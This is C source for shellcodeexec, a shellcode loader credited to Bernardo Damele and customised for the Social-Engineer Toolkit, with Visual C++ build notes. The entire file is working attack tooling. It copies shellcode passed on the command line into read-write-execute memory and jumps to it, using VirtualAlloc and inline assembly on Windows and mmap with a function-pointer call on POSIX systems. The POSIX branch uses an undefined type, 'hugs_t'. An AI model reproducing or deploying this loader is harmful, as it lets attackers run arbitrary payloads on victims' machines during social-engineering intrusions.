/*

Shellcodeexec - original work from Bernardo Damele

Customized for the Social-Engineer Toolkit (SET) by Dave Kennedy (ReL1K)

In order to build properly within VS C++ 2010 Express

Under project properties
change Configuration to Release.
Configuration Properties | C/C++ | Code Generation
Runtime Library setting.  It is set to this: Multi-threaded DLL (/MD)
Change it to this: Multi-threaded (/MT)
Rebuild.
*/
#include <sys/types.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
DWORD WINAPI exec_payload(LPVOID lpParameter);
#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
#else
#include <sys/mman.h>
#include <unistd.h>
#include <sys/wait.h>
#endif

int sys_bineval(char *argv);

int main(int argc, char *argv[])
{
        if (argc < 2) {
                exit(-1);
        }

        sys_bineval(argv[1]);

        exit(0);
}

int sys_bineval(char *argv)
{
        size_t len;

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
        int hugs;
        char *code;
#else
        int *addr;
        size_t page_size;
        hugs_t hugs;
#endif

        len = (size_t)strlen(argv);

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
        // allocate a +rwx memory page
        code = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // copy over the shellcode
        strncpy(code, argv, len);

        // execute it by ASM code defined in exec_payload function
        WaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &hugs), INFINITE);
#else
        hugs = fork();
        if(hugs<0)
                return 1;

        if(hugs==0)
        {
                page_size = (size_t)sysconf(_SC_PAGESIZE)-1;    // get page size
                page_size = (len+page_size) & ~(page_size);     // align to page boundary

                // mmap an +rwx memory page
                addr = mmap(0, page_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANON, 0, 0);

                if (addr == MAP_FAILED)
                        return 1;

                // copy over the shellcode
                strncpy((char *)addr, argv, len);

                // execute it
                ((void (*)(void))addr)();
        }

        if(hugs>0)
                waitpid(hugs, 0, WNOHANG);
#endif

        return 0;
}

#if defined(_WIN64)
void __exec_payload(LPVOID);

DWORD WINAPI exec_payload(LPVOID lpParameter)
{
        __try
        {
                __exec_payload(lpParameter);
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
        }

        return 0;
}
#elif defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
DWORD WINAPI exec_payload(LPVOID lpParameter)
{
        __try
        {
                __asm
                {
                        mov eax, [lpParameter]
                        call eax
                }
        }
        __except(EXCEPTION_EXECUTE_HANDLER)
        {
        }

        return 0;
}
#endif

